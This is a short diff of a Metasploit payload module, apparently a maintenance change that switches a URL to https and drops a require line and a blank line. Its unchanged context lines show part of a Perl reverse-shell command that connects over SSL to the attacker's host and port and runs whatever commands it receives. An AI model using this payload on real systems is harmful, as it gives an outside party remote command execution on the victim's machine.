@@ -1,9 +1,8 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'msf/core/handler/reverse_tcp_ssl'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
@@ -54,5 +53,4 @@ module MetasploitModule
     cmd += "$c=IO::Socket::SSL->new(\"#{lhost}:#{datastore['LPORT']}\");"
     cmd += "while(sysread($c,$i,8192)){syswrite($c,`$i`);}'"
   end
-
 end
